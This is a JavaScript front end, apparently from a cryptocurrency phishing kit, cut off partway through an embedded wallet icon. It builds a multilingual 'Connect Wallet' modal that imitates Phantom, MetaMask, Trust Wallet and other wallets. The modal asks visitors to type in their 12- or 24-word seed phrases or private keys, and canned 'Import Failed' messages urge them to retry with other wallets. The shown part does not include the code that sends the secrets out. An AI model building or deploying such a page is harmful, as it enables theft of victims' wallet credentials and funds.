const translations = {
    en: {
        connectWallet: "Connect Wallet",
        chooseWallet: "Choose your wallet",
        connectingTo: "Connecting {wallet} to logo.png",
        seed12Words: "12 Word Seed Phrase",
        seed12Desc: "Standard security option",
        seed24Words: "24 Word Seed Phrase", 
        seed24Desc: "Enhanced security option",
        privateKey: "Private Key",
        privateKeyDesc: "Direct wallet access",
        enter12Words: "Enter 12 Word Seed Phrase",
        enter24Words: "Enter 24 Word Seed Phrase", 
        enterPrivateKey: "Enter Private Key",
        privateKeyPlaceholder: "Enter your private key here...",
        import: "Import",
        howTo: "How to?",
        close: "Close",
        importFailed: "Import Failed",
        seedError: "Invalid seed phrase entered. Please try again or use a different wallet. If the error persists, please try again later.",
        privateKeyError: "Invalid private key entered. Please try again or use a different wallet. If the error persists, please try again later.",
        genericError: "An error occurred. Please try again or use a different wallet. If the error persists, please try again later.",
        retry: "Retry",
        fillAllFields: "Please fill in all fields"
    },
    zh: {
        connectWallet: "连接钱包",
        chooseWallet: "选择您的钱包",
        connectingTo: "正在将 {wallet} 连接到 logo.png",
        seed12Words: "12个单词助记词",
        seed12Desc: "标准安全选项",
        seed24Words: "24个单词助记词",
        seed24Desc: "增强安全选项", 
        privateKey: "私钥",
        privateKeyDesc: "直接钱包访问",
        enter12Words: "输入12个单词助记词",
        enter24Words: "输入24个单词助记词",
        enterPrivateKey: "输入私钥",
        privateKeyPlaceholder: "在此输入您的私钥...",
        import: "导入",
        howTo: "如何使用?",
        close: "关闭",
        importFailed: "导入失败",
        seedError: "输入的助记词无效。请重试或使用其他钱包。如果问题仍然存在，请稍后重试。",
        privateKeyError: "输入的私钥无效。请重试或使用其他钱包。如果问题仍然存在，请稍后重试。",
        genericError: "发生错误。请重试或使用其他钱包。如果问题仍然存在，请稍后重试。",
        retry: "重试",
        fillAllFields: "请填写所有字段"
    },
    ja: {
        connectWallet: "ウォレット接続",
        chooseWallet: "ウォレットを選択",
        connectingTo: "{wallet} を logo.png に接続中",
        seed12Words: "12語シードフレーズ",
        seed12Desc: "標準セキュリティオプション",
        seed24Words: "24語シードフレーズ",
        seed24Desc: "強化セキュリティオプション",
        privateKey: "秘密鍵",
        privateKeyDesc: "直接ウォレットアクセス",
        enter12Words: "12語シードフレーズを入力",
        enter24Words: "24語シードフレーズを入力",
        enterPrivateKey: "秘密鍵を入力",
        privateKeyPlaceholder: "秘密鍵を入力してください...",
        import: "インポート",
        howTo: "使い方?",
        close: "閉じる",
        importFailed: "インポート失敗",
        seedError: "シードフレーズが無効です。再試行するか別のウォレットを使用してください。問題が解決しない場合は後ほどお試しください。",
        privateKeyError: "秘密鍵が無効です。再試行するか別のウォレットを使用してください。問題が解決しない場合は後ほどお試しください。",
        genericError: "エラーが発生しました。再試行するか別のウォレットを使用してください。問題が解決しない場合は後ほどお試しください。",
        retry: "再試行",
        fillAllFields: "すべてのフィールドに入力してください"
    },
    ko: {
        connectWallet: "지갑 연결",
        chooseWallet: "지갑 선택",
        connectingTo: "{wallet}을(를) logo.png에 연결 중",
        seed12Words: "12단어 시드 구문",
        seed12Desc: "표준 보안 옵션",
        seed24Words: "24단어 시드 구문",
        seed24Desc: "향상된 보안 옵션",
        privateKey: "개인 키",
        privateKeyDesc: "직접 지갑 접근",
        enter12Words: "12단어 시드 구문 입력",
        enter24Words: "24단어 시드 구문 입력",
        enterPrivateKey: "개인 키 입력",
        privateKeyPlaceholder: "개인 키를 입력하세요...",
        import: "가져오기",
        howTo: "사용 방법?",
        close: "닫기",
        importFailed: "가져오기 실패",
        seedError: "시드 구문이 유효하지 않습니다. 다시 시도하거나 다른 지갑을 사용하세요. 문제가 지속되면 나중에 다시 시도하세요.",
        privateKeyError: "개인 키가 유효하지 않습니다. 다시 시도하거나 다른 지갑을 사용하세요. 문제가 지속되면 나중에 다시 시도하세요.",
        genericError: "오류가 발생했습니다. 다시 시도하거나 다른 지갑을 사용하세요. 문제가 지속되면 나중에 다시 시도하세요.",
        retry: "다시 시도",
        fillAllFields: "모든 필드를 입력해 주세요"
    },
    ru: {
        connectWallet: "Подключить кошелек",
        chooseWallet: "Выберите кошелек",
        connectingTo: "Подключение {wallet} к logo.png",
        seed12Words: "12-словная сид-фраза",
        seed12Desc: "Стандартный вариант безопасности",
        seed24Words: "24-словная сид-фраза",
        seed24Desc: "Улучшенный вариант безопасности",
        privateKey: "Приватный ключ",
        privateKeyDesc: "Прямой доступ к кошельку",
        enter12Words: "Введите 12-словную сид-фразу",
        enter24Words: "Введите 24-словную сид-фразу",
        enterPrivateKey: "Введите приватный ключ",
        privateKeyPlaceholder: "Введите ваш приватный ключ...",
        import: "Импорт",
        howTo: "Как использовать?",
        close: "Закрыть",
        importFailed: "Ошибка импорта",
        seedError: "Неверно введена сид-фраза. Попробуйте еще раз или используйте другой кошелек. Если ошибка повторится, попробуйте позже.",
        privateKeyError: "Неверно введен приватный ключ. Попробуйте еще раз или используйте другой кошелек. Если ошибка повторится, попробуйте позже.",
        genericError: "Произошла ошибка. Попробуйте еще раз или используйте другой кошелек. Если ошибка повторится, попробуйте позже.",
        retry: "Повторить",
        fillAllFields: "Пожалуйста, заполните все поля"
    },
    es: {
        connectWallet: "Conectar Cartera",
        chooseWallet: "Elige tu cartera",
        connectingTo: "Conectando {wallet} a logo.png",
        seed12Words: "Frase semilla de 12 palabras",
        seed12Desc: "Opción de seguridad estándar",
        seed24Words: "Frase semilla de 24 palabras",
        seed24Desc: "Opción de seguridad mejorada",
        privateKey: "Clave privada",
        privateKeyDesc: "Acceso directo a cartera",
        enter12Words: "Ingresar frase semilla de 12 palabras",
        enter24Words: "Ingresar frase semilla de 24 palabras",
        enterPrivateKey: "Ingresar clave privada",
        privateKeyPlaceholder: "Ingresa tu clave privada aquí...",
        import: "Importar",
        howTo: "¿Cómo usar?",
        close: "Cerrar",
        importFailed: "Error de importación",
        seedError: "Frase semilla inválida. Por favor intenta de nuevo o usa otra cartera. Si el error persiste, intenta más tarde.",
        privateKeyError: "Clave privada inválida. Por favor intenta de nuevo o usa otra cartera. Si el error persiste, intenta más tarde.",
        genericError: "Ocurrió un error. Por favor intenta de nuevo o usa otra cartera. Si el error persiste, intenta más tarde.",
        retry: "Reintentar",
        fillAllFields: "Por favor completa todos los campos"
    },
    ar: {
        connectWallet: "ربط المحفظة",
        chooseWallet: "اختر محفظتك",
        connectingTo: "جاري ربط {wallet} بـ logo.png",
        seed12Words: "عبارة استرداد 12 كلمة",
        seed12Desc: "خيار الأمان القياسي",
        seed24Words: "عبارة استرداد 24 كلمة",
        seed24Desc: "خيار الأمان المحسن",
        privateKey: "المفتاح الخاص",
        privateKeyDesc: "وصول مباشر للمحفظة",
        enter12Words: "أدخل عبارة الاسترداد 12 كلمة",
        enter24Words: "أدخل عبارة الاسترداد 24 كلمة",
        enterPrivateKey: "أدخل المفتاح الخاص",
        privateKeyPlaceholder: "أدخل مفتاحك الخاص هنا...",
        import: "استيراد",
        howTo: "كيفية الاستخدام?",
        close: "إغلاق",
        importFailed: "فشل الاستيراد",
        seedError: "عبارة الاسترداد غير صالحة. يرجى المحاولة مرة أخرى أو استخدام محفظة أخرى. إذا استمر الخطأ، يرجى المحاولة لاحقًا.",
        privateKeyError: "المفتاح الخاص غير صالح. يرجى المحاولة مرة أخرى أو استخدام محفظة أخرى. إذا استمر الخطأ، يرجى المحاولة لاحقًا.",
        genericError: "حدث خطأ. يرجى المحاولة مرة أخرى أو استخدام محفظة أخرى. إذا استمر الخطأ، يرجى المحاولة لاحقًا.",
        retry: "إعادة المحاولة",
        fillAllFields: "يرجى ملء جميع الحقول"
    },
    fr: {
        connectWallet: "Connecter le portefeuille",
        chooseWallet: "Choisissez votre portefeuille",
        connectingTo: "Connexion de {wallet} à logo.png",
        seed12Words: "Phrase de récupération 12 mots",
        seed12Desc: "Option de sécurité standard",
        seed24Words: "Phrase de récupération 24 mots",
        seed24Desc: "Option de sécurité améliorée",
        privateKey: "Clé privée",
        privateKeyDesc: "Accès direct au portefeuille",
        enter12Words: "Entrer la phrase de récupération 12 mots",
        enter24Words: "Entrer la phrase de récupération 24 mots",
        enterPrivateKey: "Entrer la clé privée",
        privateKeyPlaceholder: "Entrez votre clé privée ici...",
        import: "Importer",
        howTo: "Comment utiliser?",
        close: "Fermer",
        importFailed: "Échec de l'importation",
        seedError: "Phrase de récupération invalide. Veuillez réessayer ou utiliser un autre portefeuille. Si l'erreur persiste, veuillez réessayer plus tard.",
        privateKeyError: "Clé privée invalide. Veuillez réessayer ou utiliser un autre portefeuille. Si l'erreur persiste, veuillez réessayer plus tard.",
        genericError: "Une erreur est survenue. Veuillez réessayer ou utiliser un autre portefeuille. Si l'erreur persiste, veuillez réessayer plus tard.",
        retry: "Réessayer",
        fillAllFields: "Veuillez remplir tous les champs"
    },
    id: {
        connectWallet: "Hubungkan Dompet",
        chooseWallet: "Pilih dompet Anda",
        connectingTo: "Menghubungkan {wallet} ke logo.png",
        seed12Words: "Frase Seed 12 Kata",
        seed12Desc: "Opsi keamanan standar",
        seed24Words: "Frase Seed 24 Kata",
        seed24Desc: "Opsi keamanan tingkat lanjut",
        privateKey: "Kunci Pribadi",
        privateKeyDesc: "Akses dompet langsung",
        enter12Words: "Masukkan frase seed 12 kata",
        enter24Words: "Masukkan frase seed 24 kata",
        enterPrivateKey: "Masukkan kunci pribadi",
        privateKeyPlaceholder: "Masukkan kunci pribadi Anda di sini...",
        import: "Impor",
        howTo: "Cara menggunakan?",
        close: "Tutup",
        importFailed: "Gagal Impor",
        seedError: "Frase seed tidak valid. Silakan coba lagi atau gunakan dompet lain. Jika error berlanjut, silakan coba lagi nanti.",
        privateKeyError: "Kunci pribadi tidak valid. Silakan coba lagi atau gunakan dompet lain. Jika error berlanjut, silakan coba lagi nanti.",
        genericError: "Terjadi error. Silakan coba lagi atau gunakan dompet lain. Jika error berlanjut, silakan coba lagi nanti.",
        retry: "Coba Lagi",
        fillAllFields: "Harap isi semua bidang"
    },
    tr: {
        connectWallet: "Cüzdan Bağla",
        chooseWallet: "Cüzdanınızı seçin",
        connectingTo: "{wallet} logo.png'ye bağlanıyor",
        seed12Words: "12 Kelimelik Seed İfadesi",
        seed12Desc: "Standart güvenlik seçeneği",
        seed24Words: "24 Kelimelik Seed İfadesi",
        seed24Desc: "Gelişmiş güvenlik seçeneği",
        privateKey: "Özel Anahtar",
        privateKeyDesc: "Doğrudan cüzdan erişimi",
        enter12Words: "12 kelimelik seed ifadesini girin",
        enter24Words: "24 kelimelik seed ifadesini girin",
        enterPrivateKey: "Özel anahtarı girin",
        privateKeyPlaceholder: "Özel anahtarınızı buraya girin...",
        import: "İçe Aktar",
        howTo: "Nasıl kullanılır?",
        close: "Kapat",
        importFailed: "İçe Aktarma Başarısız",
        seedError: "Geçersiz seed ifadesi girildi. Lütfen tekrar deneyin veya farklı bir cüzdan kullanın. Sorun devam ederse, lütfen daha sonra tekrar deneyin.",
        privateKeyError: "Geçersiz özel anahtar girildi. Lütfen tekrar deneyin veya farklı bir cüzdan kullanın. Sorun devam ederse, lütfen daha sonra tekrar deneyin.",
        genericError: "Bir hata oluştu. Lütfen tekrar deneyin veya farklı bir cüzdan kullanın. Sorun devam ederse, lütfen daha sonra tekrar deneyin.",
        retry: "Tekrar Dene",
        fillAllFields: "Lütfen tüm alanları doldurun"
    }
};

	function initLanguage() {
    const userLanguage = navigator.language || navigator.userLanguage;
    console.log('Detected browser language:', userLanguage);
    
    const supportedLanguages = {
        'zh': 'zh', 'en': 'en', 'ja': 'ja', 'ko': 'ko', 'ru': 'ru', 
        'es': 'es', 'ar': 'ar', 'fr': 'fr', 'id': 'id', 'tr': 'tr'
    };
    
    const mainLanguage = userLanguage.split('-')[0];
    console.log('Main language code:', mainLanguage);
    
    const selectedLang = supportedLanguages[mainLanguage] || 'en';
    console.log('Selected language:', selectedLang);
    
    return selectedLang;
}

function applyTranslation(lang) {
    console.log('Applying translation for language:', lang);
    
    // Проверяем существует ли язык в translations
    if (!translations[lang]) {
        console.warn(`Language "${lang}" not found, falling back to English`);
        lang = 'en';
    }
    
    const t = translations[lang];
    console.log('Translation object:', t);
    
    // Функция для безопасного обновления элементов
    const updateIfExists = (selector, updateFn) => {
        const element = document.querySelector(selector);
        if (element) {
            updateFn(element);
            console.log(`Updated: ${selector}`);
        } else {
            console.warn(`Element not found: ${selector}`);
        }
    };

    // Обновляем все текстовые элементы
    updateIfExists('.modal-title', el => el.textContent = t.connectWallet);
    updateIfExists('.wallets-view p', el => el.textContent = t.chooseWallet);
    
    // Обновляем connection text (этот элемент динамический, но базовый текст можно обновить)
    const connectionText = document.querySelector('.connection-text');
    if (connectionText) {
        const baseText = t.connectingTo.replace('{wallet}', '').replace('to logo.png', '').trim();
        connectionText.innerHTML = `${baseText} <span class="wallet-name-text"></span> to logo.png`;
    }
    
    // Обновляем опции импорта
    updateIfExists('[data-option="12words"] .option-title', el => el.textContent = t.seed12Words);
    updateIfExists('[data-option="12words"] .option-desc', el => el.textContent = t.seed12Desc);
    updateIfExists('[data-option="24words"] .option-title', el => el.textContent = t.seed24Words);
    updateIfExists('[data-option="24words"] .option-desc', el => el.textContent = t.seed24Desc);
    updateIfExists('[data-option="privatekey"] .option-title', el => el.textContent = t.privateKey);
    updateIfExists('[data-option="privatekey"] .option-desc', el => el.textContent = t.privateKeyDesc);
    
    // Обновляем заголовки форм
    updateIfExists('[data-form="12words"] h3', el => el.textContent = t.enter12Words);
    updateIfExists('[data-form="24words"] h3', el => el.textContent = t.enter24Words);
    updateIfExists('[data-form="privatekey"] h3', el => el.textContent = t.enterPrivateKey);
    
    // Обновляем placeholder
    updateIfExists('.private-key-input', el => el.placeholder = t.privateKeyPlaceholder);
    
    // Обновляем кнопки
    updateIfExists('.import-btn', el => el.textContent = t.import);
    updateIfExists('.how-to-btn', el => el.textContent = t.howTo);
    updateIfExists('.close-connection-btn', el => el.textContent = t.close);
    updateIfExists('.retry-btn', el => el.textContent = t.retry);
    
    // Обновляем текст ошибки
    updateIfExists('.error-title', el => el.textContent = t.importFailed);
    
    console.log('Translation applied successfully');
}

document.addEventListener('DOMContentLoaded', function() {
    const currentLang = initLanguage();
    applyTranslation(currentLang);
    
    // Сохраняем текущий язык в глобальной переменной для использования в других функциях
    window.currentLanguage = currentLang;
    const modalHTML = `
        <div class="modal-overlay">
            <div class="modal">
                <div class="modal-header">
                    <h2 class="modal-title">Connect Wallet</h2>
                    <button class="close-btn">&times;</button>
                </div>
                <div class="modal-content">
                    <!-- Вид выбора кошелька -->
                    <div class="wallets-view active">
    <p>Choose your wallet</p>
    <div class="wallets-grid">
        <div class="wallet-item" data-wallet="Phantom">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo=" alt="Phantom">
            </div>
            <span class="wallet-name">Phantom</span>
        </div>
        <div class="wallet-item" data-wallet="Solflare">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJTIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMwMjA1MGE7c3Ryb2tlOiNmZmVmNDY7c3Ryb2tlLW1pdGVybGltaXQ6MTA7c3Ryb2tlLXdpZHRoOi41cHg7fS5jbHMtMntmaWxsOiNmZmVmNDY7fTwvc3R5bGU+PC9kZWZzPjxyZWN0IGNsYXNzPSJjbHMtMiIgeD0iMCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTIiIHJ5PSIxMiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI0LjIzLDI2LjQybDIuNDYtMi4zOCw0LjU5LDEuNWMzLjAxLDEsNC41MSwyLjg0LDQuNTEsNS40MywwLDEuOTYtLjc1LDMuMjYtMi4yNSw0LjkzbC0uNDYuNS4xNy0xLjE3Yy42Ny00LjI2LS41OC02LjA5LTQuNzItNy40M2wtNC4zLTEuMzhoMFpNMTguMDUsMTEuODVsMTIuNTIsNC4xNy0yLjcxLDIuNTktNi41MS0yLjE3Yy0yLjI1LS43NS0zLjAxLTEuOTYtMy4zLTQuNTF2LS4wOGgwWk0xNy4zLDMzLjA2bDIuODQtMi43MSw1LjM0LDEuNzVjMi44LjkyLDMuNzYsMi4xMywzLjQ2LDUuMThsLTExLjY1LTQuMjJoMFpNMTMuNzEsMjAuOTVjMC0uNzkuNDItMS41NCwxLjEzLTIuMTcuNzUsMS4wOSwyLjA1LDIuMDUsNC4wOSwyLjcxbDQuNDIsMS40Ni0yLjQ2LDIuMzgtNC4zNC0xLjQyYy0yLS42Ny0yLjg0LTEuNjctMi44NC0yLjk2TTI2LjgyLDQyLjg3YzkuMTgtNi4wOSwxNC4xMS0xMC4yMywxNC4xMS0xNS4zMiwwLTMuMzgtMi01LjI2LTYuNDMtNi43MmwtMy4zNC0xLjEzLDkuMTQtOC43Ny0xLjg0LTEuOTYtMi43MSwyLjM4LTEyLjgxLTQuMjJjLTMuOTcsMS4yOS04Ljk3LDUuMDktOC45Nyw4Ljg5LDAsLjQyLjA0LjgzLjE3LDEuMjktMy4zLDEuODgtNC42MywzLjYzLTQuNjMsNS44LDAsMi4wNSwxLjA5LDQuMDksNC41NSw1LjIybDIuNzUuOTItOS41Miw5LjE0LDEuODQsMS45NiwyLjk2LTIuNzEsMTQuNzMsNS4yMmgwWiIvPjwvc3ZnPg==" alt="Solflare">
            </div>
            <span class="wallet-name">Solflare</span>
        </div>
        <div class="wallet-item" data-wallet="MetaMask">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCAzMCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjIzIiBoZWlnaHQ9IjIzIiB4PSIzLjUiIHk9IjMuNSIgdmlld0JveD0iMCAwIDE0MS41MSAxMzYuNDIiPjxwYXRoIGZpbGw9IiNGRjVDMTYiIGQ9Im0xMzIuMjQgMTMxLjc1LTMwLjQ4LTkuMDctMjIuOTkgMTMuNzQtMTYuMDMtLjAxLTIzLTEzLjc0LTMwLjQ3IDkuMDhMMCAxMDAuNDdsOS4yNy0zNC43M0wwIDM2LjQgOS4yNyAwbDQ3LjYgMjguNDRoMjcuNzZMMTMyLjI0IDBsOS4yNyAzNi4zOC05LjI3IDI5LjM2IDkuMjcgMzQuNzItOS4yNyAzMS4zWiIvPjxwYXRoIGZpbGw9IiNGRjVDMTYiIGQ9Im05LjI3IDAgNDcuNjEgMjguNDZMNTQuOTggNDggOS4yOSAwWm0zMC40NyAxMDAuNDggMjAuOTUgMTUuOTUtMjAuOTUgNi4yNHYtMjIuMlpNNTkuMDEgNzQuMSA1NSA0OCAyOS4yMiA2NS43NWgtLjAybC4wOCAxOC4yNyAxMC40NS05LjkyaDE5LjI5Wk0xMzIuMjUgMGwtNDcuNiAyOC40Nkw4Ni41MSA0OGw0NS43Mi00OFptLTMwLjQ3IDEwMC40OC0yMC45NCAxNS45NSAyMC45NCA2LjI0di0yMi4yWm0xMC41My0zNC43M0w4Ni41MyA0OCA4Mi41IDc0LjFoMTkuMjdsMTAuNDYgOS45LjA3LTE4LjI2WiIvPjxwYXRoIGZpbGw9IiNFMzQ4MDciIGQ9Im0zOS43MyAxMjIuNjctMzAuNDYgOS4wOEwwIDEwMC40OGgzOS43M3YyMi4yWk01OS4wMiA3NC4xbDUuODIgMzcuNzEtOC4wNy0yMC45Ny0yNy40OS02LjgyIDEwLjQ2LTkuOTJINTlabTQyLjc2IDQ4LjU5IDMwLjQ3IDkuMDcgOS4yNy0zMS4yN2gtMzkuNzR6TTgyLjUgNzQuMDlsLTUuODIgMzcuNzEgOC4wNi0yMC45NyAyNy41LTYuODItMTAuNDctOS45MnoiLz48cGF0aCBmaWxsPSIjRkY4RDVEIiBkPSJtMCAxMDAuNDcgOS4yNy0zNC43M0gyOS4ybC4wNyAxOC4yNyAyNy41IDYuODIgOC4wNiAyMC45Ny00LjE1IDQuNjItMjAuOTQtMTUuOTZIMFptMTQxLjUgMC05LjI2LTM0LjczaC0xOS45M2wtLjA3IDE4LjI3LTI3LjUgNi44Mi04LjA2IDIwLjk3IDQuMTUgNC42MiAyMC45NC0xNS45NmgzOS43NFpNODQuNjQgMjguNDRINTYuODhsLTEuODkgMTkuNTQgOS44NCA2My44aDExLjg1bDkuODUtNjMuOC0xLjktMTkuNTRaIi8+PHBhdGggZmlsbD0iIzY2MTgwMCIgZD0iTTkuMjcgMCAwIDM2LjM4bDkuMjcgMjkuMzZIMjkuMkw1NC45OCA0OHptNDMuOTggODEuNjdoLTkuMDNsLTQuOTIgNC44MSAxNy40NyA0LjMzLTMuNTItOS4xNVpNMTMyLjI0IDBsOS4yNyAzNi4zOC05LjI3IDI5LjM2aC0xOS45M0w4Ni41MyA0OHpNODguMjcgODEuNjdoOS4wNGw0LjkyIDQuODItMTcuNDkgNC4zNCAzLjUzLTkuMTdabS05LjUgNDIuMyAyLjA2LTcuNTQtNC4xNS00LjYySDY0LjgybC00LjE0IDQuNjIgMi4wNSA3LjU0Ii8+PHBhdGggZmlsbD0iI0MwQzRDRCIgZD0iTTc4Ljc3IDEyMy45N3YxMi40NUg2Mi43NHYtMTIuNDVoMTYuMDJaIi8+PHBhdGggZmlsbD0iI0U3RUJGNiIgZD0ibTM5Ljc0IDEyMi42NiAyMyAxMy43NnYtMTIuNDZsLTIuMDUtNy41NHptNjIuMDMgMC0yMyAxMy43NnYtMTIuNDZsMi4wNi03LjU0eiIvPjwvc3ZnPjwvc3ZnPg==" alt="MetaMask">
            </div>
            <span class="wallet-name">MetaMask</span>
        </div>
        <div class="wallet-item" data-wallet="Trust Wallet">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTgiIGhlaWdodD0iNjUiIHZpZXdCb3g9IjAgMCA1OCA2NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgOS4zODk0OUwyOC44OTA3IDBWNjUuMDA0MkM4LjI1NDUgNTYuMzM2OSAwIDM5LjcyNDggMCAzMC4zMzUzVjkuMzg5NDlaIiBmaWxsPSIjMDUwMEZGIi8+CjxwYXRoIGQ9Ik01Ny43ODIyIDkuMzg5NDlMMjguODkxNSAwVjY1LjAwNDJDNDkuNTI3NyA1Ni4zMzY5IDU3Ljc4MjIgMzkuNzI0OCA1Ny43ODIyIDMwLjMzNTNWOS4zODk0OVoiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8yMjAxXzY5NDIpIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMjIwMV82OTQyIiB4MT0iNTEuMzYxNSIgeTE9Ii00LjE1MjkzIiB4Mj0iMjkuNTM4NCIgeTI9IjY0LjUxNDciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agb2Zmc2V0PSIwLjAyMTEyIiBzdG9wLWNvbG9yPSIjMDAwMEZGIi8+CjxzdG9wIG9mZnNldD0iMC4wNzYyNDIzIiBzdG9wLWNvbG9yPSIjMDA5NEZGIi8+CjxzdG9wIG9mZnNldD0iMC4xNjMwODkiIHN0b3AtY29sb3I9IiM0OEZGOTEiLz4KPHN0b3Agb2Zmc2V0PSIwLjQyMDA0OSIgc3RvcC1jb2xvcj0iIzAwOTRGRiIvPgo8c3RvcCBvZmZzZXQ9IjAuNjgyODg2IiBzdG9wLWNvbG9yPSIjMDAzOEZGIi8+CjxzdG9wIG9mZnNldD0iMC45MDI0NjUiIHN0b3AtY29sb3I9IiMwNTAwRkYiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4K" alt="Trust Wallet">
            </div>
            <span class="wallet-name">Trust Wallet</span>
        </div>
        <div class="wallet-item" data-wallet="Bitget">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjI1NiIgdmlld0JveD0iMCAwIDI1NiAyNTYiIHdpZHRoPSIyNTYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxmaWx0ZXIgaWQ9ImEiIGNvbG9yLWludGVycG9sYXRpb24tZmlsdGVycz0ic1JHQiIgZmlsdGVyVW5pdHM9InVzZXJTcGFjZU9uVXNlIiBoZWlnaHQ9IjQ1MS40MzEiIHdpZHRoPSI1NjkuNTU4IiB4PSItOTAuMjQxMSIgeT0iLTY5LjczNjkiPjxmZUZsb29kIGZsb29kLW9wYWNpdHk9IjAiIHJlc3VsdD0iQmFja2dyb3VuZEltYWdlRml4Ii8+PGZlQmxlbmQgaW49IlNvdXJjZUdyYXBoaWMiIGluMj0iQmFja2dyb3VuZEltYWdlRml4IiBtb2RlPSJub3JtYWwiIHJlc3VsdD0ic2hhcGUiLz48ZmVHYXVzc2lhbkJsdXIgcmVzdWx0PSJlZmZlY3QxX2ZvcmVncm91bmRCbHVyXzIwMzVfMTEwNiIgc3RkRGV2aWF0aW9uPSI0OS4yMzA4Ii8+PC9maWx0ZXI+PGZpbHRlciBpZD0iYiIgY29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzPSJzUkdCIiBmaWx0ZXJVbml0cz0idXNlclNwYWNlT25Vc2UiIGhlaWdodD0iMzcxLjUwNyIgd2lkdGg9IjM1MS41OTYiIHg9Ii0xNjAuNTExIiB5PSItMTY1Ljk4NyI+PGZlRmxvb2QgZmxvb2Qtb3BhY2l0eT0iMCIgcmVzdWx0PSJCYWNrZ3JvdW5kSW1hZ2VGaXgiLz48ZmVCbGVuZCBpbj0iU291cmNlR3JhcGhpYyIgaW4yPSJCYWNrZ3JvdW5kSW1hZ2VGaXgiIG1vZGU9Im5vcm1hbCIgcmVzdWx0PSJzaGFwZSIvPjxmZUdhdXNzaWFuQmx1ciByZXN1bHQ9ImVmZmVjdDFfZm9yZWdyb3VuZEJsdXJfMjAzNV8xMTA2IiBzdGREZXZpYXRpb249IjQ5LjIzMDgiLz48L2ZpbHRlcj48ZmlsdGVyIGlkPSJjIiBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9InNSR0IiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgaGVpZ2h0PSI0MjQuNDUyIi